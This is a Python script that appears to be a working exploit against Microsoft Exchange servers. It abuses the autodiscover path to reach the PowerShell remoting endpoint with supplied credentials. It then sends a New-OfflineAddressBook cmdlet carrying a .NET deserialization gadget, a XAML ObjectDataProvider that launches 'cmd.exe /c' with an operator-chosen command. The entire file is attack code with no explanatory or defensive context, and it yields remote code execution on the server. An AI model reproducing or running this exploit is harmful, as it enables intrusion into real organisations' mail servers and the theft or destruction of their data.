import base64
import xml.dom.minidom
import sys
import uuid
import struct
import string
import random

import warnings
warnings.filterwarnings("ignore")
warnings.filterwarnings("ignore", category=DeprecationWarning)
from requests_ntlm2 import HttpNtlmAuth
import requests


proxies = {}

USER=sys.argv[2]
PASSWORD=sys.argv[3]
CMD=sys.argv[4]
base_url = sys.argv[1]
session = requests.Session()
 

def post_request(original_url, headers, data = None, cookies = {}):
	headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
	cookies["Email"] = "autodiscover/admin@localhost"
	if "office365" in base_url:
		url = base_url + original_url
	else:
		url = base_url + "/autodiscover/admin@localhost/%s/autodiscover.json?x=a" % original_url

	if data is not None:
		r = session.post(url, headers=headers, cookies=cookies, data=data, verify=False, proxies=proxies, auth=HttpNtlmAuth('%s' % (USER), PASSWORD))
	else:
		r = session.get(url, headers=headers, cookies=cookies, verify=False, proxies=proxies)
	return r

def print_error_and_exit(error, r):
	print '[+] ', repr(error)
	if r is not None:
		print '[+] status_code: ', r.status_code
		print '[+] response headers: ', repr(r.headers)
		print '[+] response: ', repr(r.text)
	raise Exception("exploit failed")




class BasePacket:
	def __init__(self, ObjectId = 0, Destination = 2, MessageType = 0, RPID = None, PID = None, Data = ""):
		self.ObjectId = ObjectId
		self.FragmentId = 0
		self.Flags = "\x03"
		self.Destination = Destination
		self.MessageType = MessageType
		self.RPID = RPID
		self.PID = PID
		self.Data = Data

	def __str__(self):
		return "ObjectId: " + str(self.ObjectId) + ", FragmentId: " + str(self.FragmentId) + ", MessageType: " + str(self.MessageType) + ", RPID: " + str(self.RPID) + ", PID: " + str(self.PID) + ", Data: " + self.Data

	def serialize(self):
		Blob = ''.join([struct.pack('I', self.Destination),
				struct.pack('I', self.MessageType),
				self.RPID.bytes_le,
				self.PID.bytes_le,
				self.Data
			])
		BlobLength = len(Blob)
		output = ''.join([struct.pack('>Q', self.ObjectId),
			struct.pack('>Q', self.FragmentId),
			self.Flags,
			struct.pack('>I', BlobLength),
			Blob ])
		return output 

	def deserialize(self, data):
		total_len = len(data)

		i = 0 
		self.ObjectId = struct.unpack('>Q', data[i:i+8])[0]
		i = i + 8
		self.FragmentId = struct.unpack('>Q', data[i:i+8])[0]
		i = i + 8
		self.Flags = data[i]
		i = i + 1
		BlobLength = struct.unpack('>I', data[i:i+4])[0]
		i = i + 4
		Blob = data[i:i+BlobLength]
		lastIndex = i + BlobLength

		i = 0
		self.Destination = struct.unpack('I', Blob[i:i+4])[0]
		i = i + 4
		self.MessageType = struct.unpack('I', Blob[i:i+4])[0]
		i = i + 4
		self.RPID = uuid.UUID(bytes_le=Blob[i:i+16])
		i = i + 16
		self.PID =  uuid.UUID(bytes_le=Blob[i:i+16])
		i = i + 16
		self.Data = Blob[i:]

		return lastIndex

class SESSION_CAPABILITY(BasePacket):
	def __init__(self, ObjectId = 1, RPID = None, PID = None, Data = ""):
		self.Destination = 2
		self.MessageType = 0x00010002
		BasePacket.__init__(self, ObjectId, self.Destination, self.MessageType, RPID, PID, Data)

class INIT_RUNSPACEPOOL(BasePacket):
	def __init__(self, ObjectId = 1, RPID = None, PID = None, Data = ""):
		self.Destination = 2
		self.MessageType = 0x00010004
		BasePacket.__init__(self, ObjectId, self.Destination, self.MessageType, RPID, PID, Data)


class CreationXML:
	def __init__(self, sessionCapability, initRunspacPool):
		self.sessionCapability = sessionCapability
		self.initRunspacPool = initRunspacPool

	def serialize(self):
		output = self.sessionCapability.serialize() + self.initRunspacPool.serialize()
		return base64.b64encode(output)

	def deserialize(self, data):
		rawdata = base64.b64decode(data)
		lastIndex = self.sessionCapability.deserialize(rawdata)
		self.initRunspacPool.deserialize(rawdata[lastIndex:])

	def __str__(self):
		return self.sessionCapability.__str__() + self.initRunspacPool.__str__()


class PSCommand(BasePacket):
	def __init__(self, ObjectId = 1, RPID = None, PID = None, Data = ""):
		self.Destination = 2
		self.MessageType = 0x00021006
		BasePacket.__init__(self, ObjectId, self.Destination, self.MessageType, RPID, PID, Data)


def create_powershell_shell(SessionId, RPID):
	print("[+] Create powershell session")
	headers = {
		"Content-Type": "application/soap+xml;charset=UTF-8",
		}
	url = "/powershell"

	MessageID = uuid.uuid4()
	OperationID = uuid.uuid4()
	PID = uuid.UUID('{00000000-0000-0000-0000-000000000000}')
	sessionData = """<Obj RefId="0"><MS><Version N="protocolversion">2.3</Version><Version N="PSVersion">2.0</Version><Version N="SerializationVersion">1.1.0.1</Version></MS></Obj>"""
	sessionCapability = SESSION_CAPABILITY(1, RPID, PID, sessionData)
	initData = """<Obj RefId="0"><MS><I32 N="MinRunspaces">1</I32><I32 N="MaxRunspaces">1</I32><Obj N="PSThreadOptions" RefId="1"><TN RefId="0"><T>System.Management.Automation.Runspaces.PSThreadOptions</T><T>System.Enum</T><T>System.ValueType</T><T>System.Object</T></TN><ToString>Default</ToString><I32>0</I32></Obj><Obj N="ApartmentState" RefId="2"><TN RefId="1"><T>System.Threading.ApartmentState</T><T>System.Enum</T><T>System.ValueType</T><T>System.Object</T></TN><ToString>Unknown</ToString><I32>2</I32></Obj><Obj N="ApplicationArguments" RefId="3"><TN RefId="2"><T>System.Management.Automation.PSPrimitiveDictionary</T><T>System.Collections.Hashtable</T><T>System.Object</T></TN><DCT><En><S N="Key">PSVersionTable</S><Obj N="Value" RefId="4"><TNRef RefId="2" /><DCT><En><S N="Key">PSVersion</S><Version N="Value">5.1.19041.610</Version></En><En><S N="Key">PSEdition</S><S N="Value">Desktop</S></En><En><S N="Key">PSCompatibleVersions</S><Obj N="Value" RefId="5"><TN RefId="3"><T>System.Version[]</T><T>System.Array</T><T>System.Object</T></TN><LST><Version>1.0</Version><Version>2.0</Version><Version>3.0</Version><Version>4.0</Version><Version>5.0</Version><Version>5.1.19041.610</Version></LST></Obj></En><En><S N="Key">CLRVersion</S><Version N="Value">4.0.30319.42000</Version></En><En><S N="Key">BuildVersion</S><Version N="Value">10.0.19041.610</Version></En><En><S N="Key">WSManStackVersion</S><Version N="Value">3.0</Version></En><En><S N="Key">PSRemotingProtocolVersion</S><Version N="Value">2.3</Version></En><En><S N="Key">SerializationVersion</S><Version N="Value">1.1.0.1</Version></En></DCT></Obj></En></DCT></Obj><Obj N="HostInfo" RefId="6"><MS><Obj N="_hostDefaultData" RefId="7"><MS><Obj N="data" RefId="8"><TN RefId="4"><T>System.Collections.Hashtable</T><T>System.Object</T></TN><DCT><En><I32 N="Key">9</I32><Obj N="Value" RefId="9"><MS><S N="T">System.String</S><S N="V">Administrator: Windows PowerShell</S></MS></Obj></En><En><I32 N="Key">8</I32><Obj N="Value" RefId="10"><MS><S N="T">System.Management.Automation.Host.Size</S><Obj N="V" RefId="11"><MS><I32 N="width">274</I32><I32 N="height">72</I32></MS></Obj></MS></Obj></En><En><I32 N="Key">7</I32><Obj N="Value" RefId="12"><MS><S N="T">System.Management.Automation.Host.Size</S><Obj N="V" RefId="13"><MS><I32 N="width">120</I32><I32 N="height">72</I32></MS></Obj></MS></Obj></En><En><I32 N="Key">6</I32><Obj N="Value" RefId="14"><MS><S N="T">System.Management.Automation.Host.Size</S><Obj N="V" RefId="15"><MS><I32 N="width">120</I32><I32 N="height">50</I32></MS></Obj></MS></Obj></En><En><I32 N="Key">5</I32><Obj N="Value" RefId="16"><MS><S N="T">System.Management.Automation.Host.Size</S><Obj N="V" RefId="17"><MS><I32 N="width">120</I32><I32 N="height">3000</I32></MS></Obj></MS></Obj></En><En><I32 N="Key">4</I32><Obj N="Value" RefId="18"><MS><S N="T">System.Int32</S><I32 N="V">25</I32></MS></Obj></En><En><I32 N="Key">3</I32><Obj N="Value" RefId="19"><MS><S N="T">System.Management.Automation.Host.Coordinates</S><Obj N="V" RefId="20"><MS><I32 N="x">0</I32><I32 N="y">0</I32></MS></Obj></MS></Obj></En><En><I32 N="Key">2</I32><Obj N="Value" RefId="21"><MS><S N="T">System.Management.Automation.Host.Coordinates</S><Obj N="V" RefId="22"><MS><I32 N="x">0</I32><I32 N="y">9</I32></MS></Obj></MS></Obj></En><En><I32 N="Key">1</I32><Obj N="Value" RefId="23"><MS><S N="T">System.ConsoleColor</S><I32 N="V">5</I32></MS></Obj></En><En><I32 N="Key">0</I32><Obj N="Value" RefId="24"><MS><S N="T">System.ConsoleColor</S><I32 N="V">6</I32></MS></Obj></En></DCT></Obj></MS></Obj><B N="_isHostNull">false</B><B N="_isHostUINull">false</B><B N="_isHostRawUINull">false</B><B N="_useRunspaceHost">false</B></MS></Obj></MS></Obj>"""

	initRunspacPool = INIT_RUNSPACEPOOL(2, RPID, PID, initData)
	creationXml = CreationXML(sessionCapability, initRunspacPool).serialize()

	# <rsp:CompressionType s:mustUnderstand="true" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">xpress</rsp:CompressionType>
	request_data = """<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
	<s:Header>
		<a:To>https://exchange16.domaincorp.com:443/PowerShell?PSVersion=5.1.19041.610</a:To>
		<w:ResourceURI s:mustUnderstand="true">http://schemas.microsoft.com/powershell/Microsoft.Exchange</w:ResourceURI>
		<a:ReplyTo>
			<a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
		</a:ReplyTo>
		<a:Action s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action>
		<w:MaxEnvelopeSize s:mustUnderstand="true">512000</w:MaxEnvelopeSize>
		<a:MessageID>uuid:{MessageID}</a:MessageID>
		<w:Locale xml:lang="en-US" s:mustUnderstand="false" />
		<p:DataLocale xml:lang="en-US" s:mustUnderstand="false" />
		<p:SessionId s:mustUnderstand="false">uuid:{SessionId}</p:SessionId>
		<p:OperationID s:mustUnderstand="false">uuid:{OperationID}</p:OperationID>
		<p:SequenceId s:mustUnderstand="false">1</p:SequenceId>
		<w:OptionSet xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" s:mustUnderstand="true">
		
			<w:Option Name="protocolversion" MustComply="true">2.3</w:Option>
		</w:OptionSet>
		<w:OperationTimeout>PT180.000S</w:OperationTimeout>
	</s:Header>
	<s:Body>
		<rsp:Shell xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" Name="WinRM10" >
			<rsp:InputStreams>stdin pr</rsp:InputStreams>
			<rsp:OutputStreams>stdout</rsp:OutputStreams>
			<creationXml xmlns="http://schemas.microsoft.com/powershell">{creationXml}</creationXml>
		</rsp:Shell>
	</s:Body>
</s:Envelope>""".format(OperationID=OperationID, MessageID=MessageID, SessionId=SessionId, creationXml=creationXml)
	r = post_request(url, headers, request_data, {})
	if r.status_code == 200:
		doc = xml.dom.minidom.parseString(r.text);
		elements = doc.getElementsByTagName("rsp:ShellId")
		if len(elements) == 0:
			print_error_and_exit("create_powershell_shell failed with no ShellId return", r)
		ShellId = elements[0].firstChild.nodeValue
		# print "[+] Got ShellId: {ShellId}".format(ShellId=ShellId)
		print "[+] Got ShellId success"
		return ShellId
	else:
		print_error_and_exit("create_powershell_shell failed", r)



def run_cmdlet_new_offlineaddressbook(SessionId, RPID, ShellId):
	print "[+] Run cmdlet new-offlineaddressbook"
	headers = {
		"Content-Type": "application/soap+xml;charset=UTF-8",
		}
	url = "/powershell"

	name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))

	# commandData = open("psobject_memshell.txt", "rb").read()
	commandData = """<Obj RefId="13">
			<TN RefId="0">
				<T>System.Management.Automation.PSCustomObject</T>
				<T>System.Object</T>
			</TN>
			<MS>
				<S N="N">-Identity:</S>
								<!--Object type section-->
				<Obj N="V" RefId="14">
					<TN RefId="2">
					<T>System.ServiceProcess.ServiceController</T>
						<T>System.Object</T>
					</TN>
					<ToString>System.ServiceProcess.ServiceController</ToString>

					<Props>
						<S N="Name">Type</S>
						<Obj N="TargetTypeForDeserialization">
							<TN RefId="2">
								<T>System.Exception</T>
								<T>System.Object</T>
							</TN>
							<MS>
								<BA N="SerializationData">AAEAAAD/////AQAAAAAAAAAEAQAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBgIAAAAgU3lzdGVtLldpbmRvd3MuTWFya3VwLlhhbWxSZWFkZXIEAAAABgMAAABYUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQs=</BA>
							</MS>
						</Obj>
					</Props>

					<S>
                        <![CDATA[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:System="clr-namespace:System;assembly=mscorlib" xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider x:Key="LaunchCalch" ObjectType="{{x:Type Diag:Process}}" MethodName="Start"><ObjectDataProvider.MethodParameters><System:String>cmd.exe</System:String><System:String>/c {CMD}</System:String> </ObjectDataProvider.MethodParameters> </ObjectDataProvider> </ResourceDictionary>]]>
					</S>

				</Obj>
			</MS>
		</Obj>
	""".format(CMD=CMD)
	PID = uuid.uuid4()
	# print '[+] Pipeline ID: ', PID
	print('[+] Create powershell pipeline')
	c = PSCommand(3, RPID, PID, commandData)
	command_arguments = base64.b64encode(c.serialize())
	
	MessageID = uuid.uuid4()
	OperationID = uuid.uuid4()
	request_data = """<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
	<s:Header>
		<a:To>https://exchange16.domaincorp.com:443/PowerShell?PSVersion=5.1.19041.610</a:To>
		<a:ReplyTo>
			<a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
		</a:ReplyTo>
		<a:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action>
		<w:MaxEnvelopeSize s:mustUnderstand="true">512000</w:MaxEnvelopeSize>
		<a:MessageID>uuid:{MessageID}</a:MessageID>
		<w:Locale xml:lang="en-US" s:mustUnderstand="false" />
		<p:DataLocale xml:lang="en-US" s:mustUnderstand="false" />
		<p:SessionId s:mustUnderstand="false">uuid:{SessionId}</p:SessionId>
		<p:OperationID s:mustUnderstand="false">uuid:{OperationID}</p:OperationID>
		<p:SequenceId s:mustUnderstand="false">1</p:SequenceId>
		<w:ResourceURI xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">http://schemas.microsoft.com/powershell/Microsoft.Exchange</w:ResourceURI>
		<w:SelectorSet xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">
			<w:Selector Name="ShellId">{ShellId}</w:Selector>
		</w:SelectorSet>
		<w:OperationTimeout>PT180.000S</w:OperationTimeout>
	</s:Header>
	<s:Body>
	<rsp:CommandLine xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" CommandId="{CommandId}" >
		<rsp:Command>New-OfflineAddressBook</rsp:Command>
		<rsp:Arguments>{command_arguments}</rsp:Arguments>
	</rsp:CommandLine>
</s:Body>
</s:Envelope>""".format(SessionId=SessionId, MessageID=MessageID, OperationID=OperationID, ShellId=ShellId, CommandId=str(PID), command_arguments=command_arguments)
	r = post_request(url, headers, request_data, {})
	# if r.status_code == 200:
	# 	doc = xml.dom.minidom.parseString(r.text)
	# 	elements = doc.getElementsByTagName("rsp:CommandId")
	# 	if len(elements) == 0:
	# 		print_error_and_exit("run_cmdlet_new_offlineaddressbook failed with no CommandId return", r)
	# 	CommandId = elements[0].firstChild.nodeValue
	# 	# print "[+] Got CommandId: {CommandId}".format(CommandId=CommandId)
	# 	print "[+] Got CommandId success"
	# 	return CommandId
	# else:
	# 	print_error_and_exit("run_cmdlet_new_offlineaddressbook failed", r)

def request_keepalive(SessionId, ShellId):
	print "[+] Run keeping alive request"
	headers = {
		"Content-Type": "application/soap+xml;charset=UTF-8",
		}
	url = "/powershell"
	MessageID = uuid.uuid4()
	OperationID = uuid.uuid4()
	request_data = """<s:Envelope xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsman="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:wsmv="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
    <s:Header>
        <wsa:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</wsa:Action>
        <wsmv:DataLocale s:mustUnderstand="false" xml:lang="en-US" />
        <wsman:Locale s:mustUnderstand="false" xml:lang="en-US" />
        <wsman:MaxEnvelopeSize s:mustUnderstand="true">512000</wsman:MaxEnvelopeSize>
        <wsa:MessageID>uuid:{MessageID}</wsa:MessageID>
        <wsman:OperationTimeout>PT20S</wsman:OperationTimeout>
        <wsa:ReplyTo>
            <wsa:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
        </wsa:ReplyTo>
        <wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>
        <wsmv:SessionId s:mustUnderstand="false">uuid:{SessionId}</wsmv:SessionId>
        <wsa:To>http://ex01.lab.local/</wsa:To>
        <wsman:OptionSet s:mustUnderstand="true">
            <wsman:Option Name="WSMAN_CMDSHELL_OPTION_KEEPALIVE">True</wsman:Option>
        </wsman:OptionSet>
        <wsman:SelectorSet>
            <wsman:Selector Name="ShellId">{ShellId}</wsman:Selector>
        </wsman:SelectorSet>
    </s:Header>
    <s:Body>
        <rsp:Receive>
            <rsp:DesiredStream>stdout</rsp:DesiredStream>
        </rsp:Receive>
    </s:Body>
	</s:Envelope>""".format(SessionId=SessionId, MessageID=MessageID, OperationID=OperationID, ShellId=ShellId)
	r = post_request(url, headers, request_data, {})
	if r.status_code == 200:
		print "[+] Success keeping alive"
	else:
		print_error_and_exit("keeping alive failed", r)

def remove_session(SessionId, ShellId):
	print "[+] Run keeping alive request"
	headers = {
		"Content-Type": "application/soap+xml;charset=UTF-8",
		}
	url = "/powershell"
	MessageID = uuid.uuid4()
	OperationID = uuid.uuid4()
	request_data = """<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsman="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:wsmv="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
    <s:Header>
        <wsa:Action s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</wsa:Action>
        <wsmv:DataLocale s:mustUnderstand="false" xml:lang="en-US" />
        <wsman:Locale s:mustUnderstand="false" xml:lang="en-US" />
        <wsman:MaxEnvelopeSize s:mustUnderstand="true">512000</wsman:MaxEnvelopeSize>
        <wsa:MessageID>uuid:{MessageID}</wsa:MessageID>
        <wsman:OperationTimeout>PT20S</wsman:OperationTimeout>
        <wsa:ReplyTo>
            <wsa:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
        </wsa:ReplyTo>
        <wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>
        <wsmv:SessionId s:mustUnderstand="false">uuid:{SessionId}</wsmv:SessionId>
        <wsa:To>http://ex01.lab.local/</wsa:To>
        <wsman:SelectorSet>
            <wsman:Selector Name="ShellId">{ShellId}</wsman:Selector>
        </wsman:SelectorSet>
    </s:Header>
    <s:Body />
</s:Envelope>""".format(SessionId=SessionId, MessageID=MessageID, OperationID=OperationID, ShellId=ShellId)
	r = post_request(url, headers, request_data, {})
	if r.status_code == 200:
		print "[+] Success remove session"
	else:
		print_error_and_exit("remove session failed", r)

MessageID = uuid.uuid4()
OperationID = uuid.uuid4()
SessionId = uuid.uuid4()
PID = uuid.UUID('{00000000-0000-0000-0000-000000000000}')
RPID = uuid.uuid4()

shell_id = create_powershell_shell(SessionId, RPID)
request_keepalive(SessionId, shell_id)
run_cmdlet_new_offlineaddressbook(SessionId, RPID, shell_id)
remove_session(SessionId, shell_id)